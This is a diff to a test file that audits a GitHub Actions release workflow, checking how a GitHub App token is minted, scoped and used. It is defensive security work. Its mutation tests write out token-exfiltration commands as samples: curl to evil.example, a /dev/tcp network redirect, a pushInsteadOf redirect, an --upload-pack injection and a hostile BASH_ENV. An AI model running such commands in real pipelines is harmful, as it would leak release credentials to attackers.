@@ -25,7 +25,8 @@
  * `&&`, `||` and `|`, follows `$(…)`, and strips quotes. Anything it cannot place is red, not skipped. The
  * mutation tests at the bottom are its proof that each rule can fail.
  */
-import { readFileSync } from 'node:fs'
+import { readdirSync, readFileSync } from 'node:fs'
+import path from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { describe, expect, it } from 'vitest'
 import { parse } from 'yaml'
@@ -36,7 +37,8 @@ import {
     RELEASE_ENVIRONMENT,
 } from '../../scripts/release-app/manifest'
 
-const WORKFLOW = fileURLToPath(new URL('../../.github/workflows/release.yml', import.meta.url))
+const WORKFLOWS = fileURLToPath(new URL('../../.github/workflows/', import.meta.url))
+const RELEASE_WORKFLOW = 'release.yml'
 const MINT_ACTION = 'actions/create-github-app-token@'
 
 type Step = {
@@ -44,17 +46,27 @@ type Step = {
     name?: string
     uses?: string
     run?: string
+    shell?: string
     with?: Record<string, unknown>
     env?: Record<string, unknown>
 }
-type Job = { environment?: unknown; steps?: Step[] } & Record<string, unknown>
-type Workflow = { jobs: Record<string, Job> } & Record<string, unknown>
+type Job = { environment?: unknown; steps?: Step[]; env?: Record<string, unknown>; defaults?: unknown } & Record<
+    string,
+    unknown
+>
+type Workflow = { jobs: Record<string, Job>; on?: unknown; env?: Record<string, unknown>; defaults?: unknown } & Record<
+    string,
+    unknown
+>
+
+/** What starts release.yml. A new trigger is a new way to reach the job that holds the key, so it is pinned. */
+const TRIGGERS = { push: { branches: ['main'], tags: ['v[0-9]+.[0-9]+.[0-9]+'] } }
 
 /** Commands that need no permission and reach nothing: they run on the runner and stop there. */
-const LOCAL_COMMANDS = new Set(['set', 'echo', 'printf', 'base64', 'mktemp', 'true', 'test', '['])
+const LOCAL_COMMANDS = new Set(['echo', 'printf', 'base64', 'mktemp', 'true', 'test', '['])
 
-/** git subcommands that touch only the local repository. */
-const LOCAL_GIT = new Set(['init', 'rev-parse', 'config', 'tag', 'commit', 'apply', 'add', 'diff', 'status'])
+/** git subcommands that touch only the local repository and cannot change where a later push goes. */
+const LOCAL_GIT = new Set(['init', 'rev-parse'])
 
 /** `git -c` settings the push may carry. */
 const GIT_CONFIG_KEYS = new Set(['core.hooksPath', 'http.extraheader'])
@@ -62,9 +74,27 @@ const GIT_CONFIG_KEYS = new Set(['core.hooksPath', 'http.extraheader'])
 /** The only `git push` options allowed: none of them pushes more refs or rewrites one. */
 const PUSH_OPTIONS = new Set(['--no-verify', '--atomic', '-q', '--quiet', '--porcelain'])
 
-/** The refs a push may land on, as written in release.yml, and the remote it may go to. */
-const PUSH_DESTINATIONS = new Set(['main', 'refs/heads/main', 'refs/tags/v$VERSION'])
+/**
+ * The refs, exactly as release.yml writes them. The fetch builds the scratch repository the push goes from
+ * (the verified commit, as `release`, and its tag); the push lands those two and nothing else.
+ */
+const FETCH_REFSPECS = ['+$sha:refs/heads/release', '+refs/tags/v$VERSION:refs/tags/v$VERSION']
+const PUSH_REFSPECS = ['release:main', 'refs/tags/v$VERSION']
 const PUSH_REMOTE = 'https://github.com/$GITHUB_REPOSITORY'
+
+/** The token step's own `env`, exactly: the token, the version, and git told to read no config file. */
+const STEP_ENV: Record<string, RegExp> = {
+    VERSION: /^\$\{\{ needs\.plan\.outputs\.version \}\}$/,
+    TOKEN: /^\$\{\{ steps\.[A-Za-z0-9_-]+\.outputs\.token \}\}$/,
+    GIT_CONFIG_GLOBAL: /^\/dev\/null$/,
+    GIT_CONFIG_NOSYSTEM: /^1$/,
+}
+
+/** Where a redirection in the token step may point. A file anywhere else could hand the token on. */
+const REDIRECT_TARGETS = new Set(['$GITHUB_STEP_SUMMARY', '/dev/null', '&1', '&2'])
+
+/** Shell variables that change what git or gh reads, or where it sends things. Never set in the token step. */
+const RISKY_VARIABLE = /^(GIT_|GH_|GITHUB_|HOME$|XDG_CONFIG_HOME$|BASH_ENV$|ENV$|SSL_|CURL_|HTTPS?_PROXY$|ALL_PROXY$)/i
 
 type Finding = string
 type Operation = { command: string; permission: keyof typeof RELEASE_APP_PERMISSIONS | null }
@@ -81,9 +111,15 @@ function strings(value: unknown, at: string, out: { at: string; text: string }[]
     return out
 }
 
+function environmentOf(job: Job): unknown {
+    const env = job.environment
+    return env && typeof env === 'object' && 'name' in env ? (env as { name: unknown }).name : env
+}
+
 /**
  * Split a script into commands, each a list of words with quotes removed. A `$(…)` becomes the word `$(…)`
- * in its command, and its own commands are returned too. Comments run to the end of the line.
+ * in its command, and its own commands are returned too. Comments run to the end of the line. Backticks and
+ * process substitution are refused by the caller before this runs.
  */
 function commandsOf(script: string): string[][] {
     const commands: string[][] = []
@@ -162,41 +198,67 @@ function matchParen(text: string, open: number): number {
     throw new Error('unbalanced $(')
 }
 
-/** Drop leading `NAME=value` assignments, `{`/`}` groups and redirections (with their targets). */
-function significant(command: string[]): string[] {
-    const out: string[] = []
+/**
+ * A command's words without its redirections and `{`/`}`/`!`, plus the variables it assigns (a leading
+ * `NAME=value`, or the whole command when it is only assignments) and where it redirects to.
+ */
+function significant(command: string[]): { words: string[]; assigns: string[]; redirects: string[] } {
+    const words: string[] = []
+    const assigns: string[] = []
+    const redirects: string[] = []
     for (let i = 0; i < command.length; i++) {
         const w = command[i]
-        if (out.length === 0 && /^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) continue
-        if (w === '{' || w === '}' || w === '!') continue
-        if (/^[0-9]*>{1,2}&?$|^<$/.test(w)) {
-            i++
+        const assignment = /^([A-Za-z_][A-Za-z0-9_]*)=/.exec(w)
+        if (words.length === 0 && assignment) {
+            assigns.push(assignment[1])
             continue
         }
-        if (/^[0-9]*>{1,2}&?\S|^<\S/.test(w)) continue
-        out.push(w)
+        if (w === '{' || w === '}' || w === '!') continue
+        const redirect = /^[0-9]*(>{1,2}|<{1,3}|&>{1,2})(.*)$/.exec(w)
+        if (redirect) {
+            const target = redirect[2] !== '' ? redirect[2] : (command[++i] ?? '')
+            redirects.push(redirect[1].startsWith('<') ? `<${target}` : target)
+            continue
+        }
+        words.push(w)
     }
-    return out
+    return { words, assigns, redirects }
 }
 
 /** Classify one command of a token-holding step. Pushes a finding for anything it cannot place. */
-function classify(words: string[], findings: Finding[]): Operation | null {
-    const [program, ...args] = significant(words)
+function classify(command: string[], findings: Finding[]): Operation | null {
+    const { words, assigns, redirects } = significant(command)
+    for (const name of assigns) {
+        if (RISKY_VARIABLE.test(name))
+            findings.push(`the token step sets ${name}, which changes what git or a tool reads`)
+    }
+    for (const target of redirects) {
+        if (!REDIRECT_TARGETS.has(target)) findings.push(`the token step redirects to ${target}`)
+    }
+    const [program, ...args] = words
     if (program === undefined) return null
+    if (program === 'set') {
+        if (args.join(' ') !== '-euo pipefail')
+            findings.push(`\`set ${args.join(' ')}\` in the token step (only -euo pipefail)`)
+        return { command: 'set', permission: null }
+    }
     if (LOCAL_COMMANDS.has(program)) return { command: program, permission: null }
     if (program !== 'git') {
         findings.push(
-            `unclassified command \`${words.join(' ')}\` in a step holding the release app's token: name the App ` +
+            `unclassified command \`${command.join(' ')}\` in a step holding the release app's token: name the App ` +
                 'permission it needs in this test (and RELEASE_APP_PERMISSIONS), or move it out of that step',
         )
         return null
     }
     let i = 0
+    const configs: string[] = []
     while (i < args.length && args[i].startsWith('-')) {
         if (args[i] === '-C') i += 2
         else if (args[i] === '-c') {
-            const key = (args[i + 1] ?? '').split('=')[0]
+            const setting = args[i + 1] ?? ''
+            const key = setting.split('=')[0]
             if (!GIT_CONFIG_KEYS.has(key)) findings.push(`git -c ${key} is not a setting the push may carry`)
+            configs.push(setting)
             i += 2
         } else {
             findings.push(`unclassified git option ${args[i]}`)
@@ -205,27 +267,39 @@ function classify(words: string[], findings: Finding[]): Operation | null {
     }
     const sub = args[i]
     const rest = args.slice(i + 1)
-    if (LOCAL_GIT.has(sub)) return { command: `git ${sub}`, permission: null }
+    const options = rest.filter((w) => w.startsWith('-'))
+    const positional = rest.filter((w) => !w.startsWith('-'))
+    if (LOCAL_GIT.has(sub)) {
+        for (const option of options) if (option !== '-q') findings.push(`git ${sub} ${option} is not allowed`)
+        return { command: `git ${sub}`, permission: null }
+    }
     if (sub === 'fetch') {
-        const remote = rest.find((w) => !w.startsWith('-'))
-        if (remote === '$GITHUB_WORKSPACE') return { command: 'git fetch (local)', permission: null }
-        return { command: 'git fetch', permission: 'contents' }
+        const [remote, ...refspecs] = positional
+        for (const option of options) if (option !== '-q') findings.push(`git fetch ${option} is not allowed`)
+        if (remote !== '$GITHUB_WORKSPACE')
+            findings.push(`git fetch from ${remote}: the token step fetches only from the workspace`)
+        if (JSON.stringify(refspecs) !== JSON.stringify(FETCH_REFSPECS)) {
+            findings.push(`git fetch takes ${JSON.stringify(refspecs)}; expected ${JSON.stringify(FETCH_REFSPECS)}`)
+        }
+        return { command: 'git fetch (local)', permission: null }
     }
     if (sub === 'push') {
-        const positional = rest.filter((w) => !w.startsWith('-'))
-        for (const option of rest.filter((w) => w.startsWith('-'))) {
+        for (const option of options) {
             if (!PUSH_OPTIONS.has(option))
                 findings.push(`git push ${option} is not allowed (only ${[...PUSH_OPTIONS].join(' ')})`)
         }
+        if (!options.includes('--no-verify')) findings.push('git push runs without --no-verify, so a hook could run')
+        if (!configs.includes('core.hooksPath=/dev/null'))
+            findings.push('git push runs without -c core.hooksPath=/dev/null, so a hook could run')
         const [remote, ...refspecs] = positional
         if (remote !== PUSH_REMOTE) findings.push(`git push goes to ${remote}, not ${PUSH_REMOTE}`)
-        if (refspecs.length === 0) findings.push('git push names no refspec, so git decides what it pushes')
         for (const refspec of refspecs) {
             if (refspec.startsWith('+')) findings.push(`git push ${refspec} forces`)
             const [src, dst = src] = refspec.replace(/^\+/, '').split(':')
             if (src === '') findings.push(`git push ${refspec} deletes ${dst}`)
-            if (!PUSH_DESTINATIONS.has(dst))
-                findings.push(`git push lands on ${dst}, which is not main or the release tag`)
+        }
+        if (JSON.stringify(refspecs) !== JSON.stringify(PUSH_REFSPECS)) {
+            findings.push(`git push lands ${JSON.stringify(refspecs)}; only ${JSON.stringify(PUSH_REFSPECS)} may`)
         }
         return { command: 'git push', permission: 'contents' }
     }
@@ -233,35 +307,80 @@ function classify(words: string[], findings: Finding[]): Operation | null {
     return null
 }
 
-/** Everything wrong with a workflow, and the permissions its use of the release app forces. */
+/** The `${{ … }}` expressions in a string. */
+function expressions(text: string): string[] {
+    return [...text.matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1].trim())
+}
+
+/**
+ * Every workflow but release.yml: none may run a job in the `release` environment (the only way to read its
+ * secret), and none may name the App's key or client id at all.
+ */
+function auditOthers(files: { name: string; workflow: Workflow }[]): Finding[] {
+    const findings: Finding[] = []
+    for (const { name, workflow } of files) {
+        if (name === RELEASE_WORKFLOW) continue
+        for (const [jobName, job] of Object.entries(workflow?.jobs ?? {})) {
+            if (environmentOf(job) === RELEASE_ENVIRONMENT || /\brelease\b/.test(JSON.stringify(job.environment ?? '')))
+                findings.push(`${name}: job ${jobName} runs in the "${RELEASE_ENVIRONMENT}" environment`)
+        }
+        for (const s of strings(workflow, name)) {
+            if (s.text.includes(KEY_SECRET) || s.text.includes(CLIENT_ID_VARIABLE))
+                findings.push(`${s.at} names the release app's credentials`)
+        }
+    }
+    return findings
+}
+
+/** Everything wrong with release.yml, and the permissions its use of the release app forces. */
 function audit(workflow: Workflow): { findings: Finding[]; forced: Map<string, string> } {
     const findings: Finding[] = []
     const forced = new Map<string, string>()
-    const credential = new RegExp(`\\b(secrets\\.${KEY_SECRET}|vars\\.${CLIENT_ID_VARIABLE})\\b`)
 
-    // 1. Where the key and client id are read.
-    const reads = strings(workflow, 'workflow').filter((s) => credential.test(s.text))
+    if (JSON.stringify(workflow.on) !== JSON.stringify(TRIGGERS)) {
+        findings.push(`release.yml's triggers are ${JSON.stringify(workflow.on)}; expected ${JSON.stringify(TRIGGERS)}`)
+    }
+
+    // 1. Where the token is minted, and in which environment. Only that job can read the environment's secret.
     const mints: { job: string; index: number; step: Step }[] = []
     for (const [jobName, job] of Object.entries(workflow.jobs ?? {})) {
         ;(job.steps ?? []).forEach((step, index) => {
             if (typeof step.uses === 'string' && step.uses.startsWith(MINT_ACTION))
                 mints.push({ job: jobName, index, step })
         })
+        if (
+            environmentOf(job) === RELEASE_ENVIRONMENT &&
+            !(job.steps ?? []).some((s) => s.uses?.startsWith(MINT_ACTION))
+        )
+            findings.push(`job ${jobName} runs in the "${RELEASE_ENVIRONMENT}" environment without minting the token`)
     }
     if (mints.length !== 1) findings.push(`expected exactly one ${MINT_ACTION} step, found ${mints.length}`)
     const mint = mints[0]
     if (!mint) return { findings, forced }
-    const mintPath = `workflow.jobs.${mint.job}.steps[${mint.index}].with`
-    for (const read of reads) {
-        if (!read.at.startsWith(`${mintPath}.`)) findings.push(`${read.at} reads the release app's credentials`)
-    }
     const job = workflow.jobs[mint.job]
-    if (job.environment !== RELEASE_ENVIRONMENT) {
+    if (environmentOf(job) !== RELEASE_ENVIRONMENT) {
         findings.push(`job ${mint.job} mints the token outside the "${RELEASE_ENVIRONMENT}" environment`)
     }
     if (typeof mint.step.id !== 'string') {
         findings.push('the mint step has no id, so its token cannot be traced')
         return { findings, forced }
+    }
+
+    // 1b. Every mention of `secrets` or `vars` in the workflow, in any spelling (`secrets.X`, `secrets['X']`,
+    // `toJSON(secrets)`), and every literal naming the key or client id. Only the mint's two inputs may.
+    const mintPath = `workflow.jobs.${mint.job}.steps[${mint.index}].with`
+    const allowed: Record<string, string> = {
+        [`${mintPath}.private-key`]: `secrets.${KEY_SECRET}`,
+        [`${mintPath}.client-id`]: `vars.${CLIENT_ID_VARIABLE}`,
+    }
+    for (const s of strings(workflow, 'workflow')) {
+        const credentialish = expressions(s.text).filter((e) => /\b(secrets|vars)\b/.test(e))
+        const named = s.text.includes(KEY_SECRET) || s.text.includes(CLIENT_ID_VARIABLE)
+        if (credentialish.length === 0 && !named) continue
+        const expected = allowed[s.at]
+        if (expected === undefined || s.text !== `\${{ ${expected} }}`) {
+            findings.push(`${s.at} reads secrets or variables, or names the release app's credentials`)
+        }
     }
 
     // 2. What the token is asked for.
@@ -281,11 +400,17 @@ function audit(workflow: Workflow): { findings: Finding[]; forced: Map<string, s
         )
     }
 
-    // 3 and 4. Where the token goes, and what each step that holds it does.
+    // 3. Where the token goes: one later run step's `env`, which must be the job's last step. A spelling this
+    // cannot trace (`steps['id']`, `toJSON(steps)`) is red wherever it appears.
+    for (const s of strings(workflow, 'workflow')) {
+        if (
+            expressions(s.text).some((e) => /\bsteps\s*\[|\(\s*steps\s*\)|\bsteps\s*\)|\bsteps\s*,|\bsteps\s*$/.test(e))
+        )
+            findings.push(`${s.at} reads the steps context in a form this guard cannot trace`)
+    }
     const tokenRef = new RegExp(`steps\\.${mint.step.id}\\.outputs`)
-    const all = strings(workflow, 'workflow').filter((s) => tokenRef.test(s.text))
     const consumers = new Set<number>()
-    for (const use of all) {
+    for (const use of strings(workflow, 'workflow').filter((s) => tokenRef.test(s.text))) {
         const match = new RegExp(
             `^workflow\\.jobs\\.${mint.job}\\.steps\\[(\\d+)\\]\\.env\\.[A-Za-z_][A-Za-z0-9_]*$`,
         ).exec(use.at)
@@ -298,22 +423,53 @@ function audit(workflow: Workflow): { findings: Finding[]; forced: Map<string, s
         consumers.add(index)
     }
     if (consumers.size === 0) findings.push("nothing uses the release app's token")
+    if (consumers.size > 1) findings.push(`${consumers.size} steps hold the token; one may`)
+
+    // Nothing around the step may change how its shell or git behaves.
+    for (const [where, holder] of [
+        ['the workflow', workflow],
+        [`job ${mint.job}`, job],
+    ] as const) {
+        if (holder.defaults !== undefined) findings.push(`${where} sets defaults, which change the token step's shell`)
+        for (const key of Object.keys(holder.env ?? {})) {
+            if (RISKY_VARIABLE.test(key)) findings.push(`${where} sets ${key} for the token step`)
+        }
+    }
+
+    // 4. What the step holding the token does.
     for (const index of consumers) {
         const step = (job.steps ?? [])[index]
+        const label = `step "${step.name ?? index}"`
         if (typeof step.run !== 'string' || step.uses !== undefined) {
-            findings.push(`step ${index} of ${mint.job} holds the token but is not a plain run step`)
+            findings.push(`${label} of ${mint.job} holds the token but is not a plain run step`)
             continue
         }
+        if (index !== (job.steps ?? []).length - 1)
+            findings.push(`${label} holds the token but is not the job's last step`)
+        if (step.shell !== undefined) findings.push(`${label} sets shell: ${step.shell}; it must run the default bash`)
+        const env = step.env ?? {}
+        for (const key of Object.keys(env)) {
+            const rule = STEP_ENV[key]
+            if (!rule || !rule.test(String(env[key]))) findings.push(`${label} sets env ${key}=${String(env[key])}`)
+        }
+        for (const key of Object.keys(STEP_ENV)) if (!(key in env)) findings.push(`${label} does not set env ${key}`)
         if (/GITHUB_(ENV|OUTPUT|PATH)\b/.test(step.run)) {
-            findings.push(
-                `step "${step.name ?? index}" holds the token and writes $GITHUB_ENV, $GITHUB_OUTPUT or $GITHUB_PATH`,
-            )
+            findings.push(`${label} holds the token and writes $GITHUB_ENV, $GITHUB_OUTPUT or $GITHUB_PATH`)
+        }
+        for (const [pattern, what] of [
+            ['`', 'a backtick command substitution'],
+            ['<(', 'a process substitution'],
+            ['>(', 'a process substitution'],
+            ['/dev/tcp', 'a bash network redirect'],
+            ['/dev/udp', 'a bash network redirect'],
+        ] as const) {
+            if (step.run.includes(pattern)) findings.push(`${label} holds the token and uses ${what} (${pattern})`)
         }
         let commands: string[][]
         try {
             commands = commandsOf(step.run)
         } catch (err) {
-            findings.push(`step "${step.name ?? index}": ${(err as Error).message}`)
+            findings.push(`${label}: ${(err as Error).message}`)
             continue
         }
         for (const command of commands) {
@@ -322,7 +478,7 @@ function audit(workflow: Workflow): { findings: Finding[]; forced: Map<string, s
         }
     }
 
-    // 6. Both directions.
+    // 5. Both directions.
     const needed = new Set<string>(['metadata', ...forced.values()])
     for (const name of needed) {
         if (!(name in RELEASE_APP_PERMISSIONS))
@@ -335,8 +491,14 @@ function audit(workflow: Workflow): { findings: Finding[]; forced: Map<string, s
     return { findings, forced }
 }
 
+function loadAll(): { name: string; workflow: Workflow }[] {
+    return readdirSync(WORKFLOWS)
+        .filter((name) => /\.ya?ml$/.test(name))
+        .map((name) => ({ name, workflow: parse(readFileSync(path.join(WORKFLOWS, name), 'utf8')) as Workflow }))
+}
+
 function load(): Workflow {
-    return parse(readFileSync(WORKFLOW, 'utf8')) as Workflow
+    return parse(readFileSync(path.join(WORKFLOWS, RELEASE_WORKFLOW), 'utf8')) as Workflow
 }
 
 function pushJob(workflow: Workflow): Job {
@@ -360,6 +522,31 @@ describe('release.yml and the release app agree', () => {
         const { findings, forced } = audit(load())
         expect(findings).toEqual([])
         expect([...forced.entries()]).toEqual([['git push', 'contents']])
+    })
+
+    it('no other workflow runs in the release environment or names its credentials', () => {
+        const files = loadAll()
+        expect(files.map((f) => f.name)).toContain(RELEASE_WORKFLOW)
+        expect(files.length).toBeGreaterThan(1)
+        expect(auditOthers(files)).toEqual([])
+    })
+
+    it('goes red for another workflow in the release environment, or naming the key', () => {
+        const job = { 'runs-on': 'ubuntu-latest', steps: [{ run: 'true' }] }
+        expect(auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { ...job, environment: 'release' } } } }])).toEqual(
+            ['x.yml: job a runs in the "release" environment'],
+        )
+        expect(
+            auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { ...job, environment: { name: 'release' } } } } }]),
+        ).toHaveLength(1)
+        expect(
+            auditOthers([
+                {
+                    name: 'x.yml',
+                    workflow: { jobs: { a: { ...job, env: { K: "${{ secrets['RELEASE_BOT_PRIVATE_KEY'] }}" } } } },
+                },
+            ]),
+        ).toHaveLength(1)
     })
 })
 
@@ -429,7 +616,7 @@ describe('the guard goes red when release.yml outgrows the App', () => {
     it('a push to another branch', () =>
         red(
             (w) => appendRun(w, 'git -C "$pusher" push "https://github.com/$GITHUB_REPOSITORY" release:other'),
-            /lands on other/,
+            /lands \["release:other"\]/,
         ))
     it('a push to another repository', () =>
         red(
@@ -463,7 +650,7 @@ describe('the guard goes red when release.yml outgrows the App', () => {
     it('the key read in another job', () =>
         red((w) => {
             w.jobs.pack.steps?.push({ run: 'true', env: { K: '${{ secrets.RELEASE_BOT_PRIVATE_KEY }}' } })
-        }, /jobs\.pack\..*reads the release app's credentials/))
+        }, /jobs\.pack\..*reads secrets or variables/))
     it('the mint outside the release environment', () =>
         red((w) => {
             pushJob(w).environment = 'npm-publish'
@@ -482,6 +669,80 @@ describe('the guard goes red when release.yml outgrows the App', () => {
         red((w) => {
             pushStep(w).run = 'echo "$TOKEN" | base64 -w0 >/dev/null\n'
         }, /grants contents, which nothing in release\.yml uses/))
+    it('a backtick command', () =>
+        red((w) => appendRun(w, 'echo `curl -H "Authorization: token $TOKEN" https://api.github.com/x`'), /backtick/))
+    it('a process substitution', () =>
+        red((w) => appendRun(w, 'echo <(curl -d "$TOKEN" https://evil.example)'), /process substitution/))
+    it('a bash network redirect', () =>
+        red((w) => appendRun(w, 'printf %s "$TOKEN" > /dev/tcp/evil.example/443'), /network redirect/))
+    it('the token written to a file', () =>
+        red((w) => appendRun(w, 'printf %s "$TOKEN" > "$RUNNER_TEMP/t"'), /redirects to \$RUNNER_TEMP\/t/))
+    it('a git config that redirects the push', () =>
+        red(
+            (w) => appendRun(w, 'git -C "$pusher" config url.https://evil/.pushInsteadOf https://github.com/'),
+            /unclassified git subcommand `git config`/,
+        ))
+    it('a GIT_CONFIG_* prefix', () =>
+        red((w) => appendRun(w, 'GIT_CONFIG_COUNT=1 git -C "$pusher" rev-parse HEAD'), /sets GIT_CONFIG_COUNT/))
+    it('a GIT_CONFIG_* in the step env', () =>
+        red((w) => {
+            const step = pushStep(w)
+            step.env = { ...step.env, GIT_CONFIG_COUNT: '1' }
+        }, /sets env GIT_CONFIG_COUNT/))
+    it('BASH_ENV in the job env', () =>
+        red((w) => {
+            pushJob(w).env = { BASH_ENV: './evil.sh' }
+        }, /job push sets BASH_ENV/))
+    it('a step shell', () =>
+        red((w) => {
+            pushStep(w).shell = 'python'
+        }, /sets shell: python/))
+    it('a defaults.run.shell', () =>
+        red((w) => {
+            w.defaults = { run: { shell: 'bash -c "curl x; bash -e {0}"' } }
+        }, /the workflow sets defaults/))
+    it('set -a, which exports every later assignment', () =>
+        red((w) => {
+            const step = pushStep(w)
+            step.run = `set -a\n${step.run}`
+        }, /`set -a`/))
+    it('a fetch from elsewhere into the push', () =>
+        red(
+            (w) => appendRun(w, 'git -C "$pusher" fetch -q "$GITHUB_WORKSPACE" "+other:refs/heads/release"'),
+            /git fetch takes/,
+        ))
+    it('a fetch running a command', () =>
+        red(
+            (w) => appendRun(w, 'git fetch --upload-pack="curl x;git-upload-pack" "$GITHUB_WORKSPACE"'),
+            /--upload-pack=curl x;git-upload-pack is not allowed/,
+        ))
+    it('git init with a template', () =>
+        red((w) => appendRun(w, 'git init --template=/tmp/t "$pusher"'), /git init --template/))
+    it('a push that runs hooks', () =>
+        red((w) => {
+            const step = pushStep(w)
+            step.run = step.run?.replace('push --no-verify', 'push')
+        }, /without --no-verify/))
+    it('a toJSON(secrets) in the push job', () =>
+        red((w) => {
+            pushStep(w).env = { ...pushStep(w).env, ALL: '${{ toJSON(secrets) }}' }
+        }, /reads secrets or variables/))
+    it("the token read as steps['app-token']", () =>
+        red((w) => {
+            w.jobs.pack.steps?.push({ uses: 'x/y@v1', with: { t: "${{ steps['app-token'].outputs.token }}" } })
+        }, /reads the steps context in a form/))
+    it('a step after the token step', () =>
+        red((w) => {
+            pushJob(w).steps?.push({ run: 'true' })
+        }, /is not the job's last step/))
+    it('a widened trigger', () =>
+        red((w) => {
+            w.on = { ...(w.on as object), workflow_dispatch: {} }
+        }, /triggers are/))
+    it('a second job in the release environment', () =>
+        red((w) => {
+            w.jobs.pack.environment = { name: 'release' }
+        }, /job pack runs in the "release" environment without minting/))
     it('a second mint', () =>
         red((w) => {
             w.jobs.pack.steps?.push({ id: 'again', uses: `${MINT_ACTION}v3` })
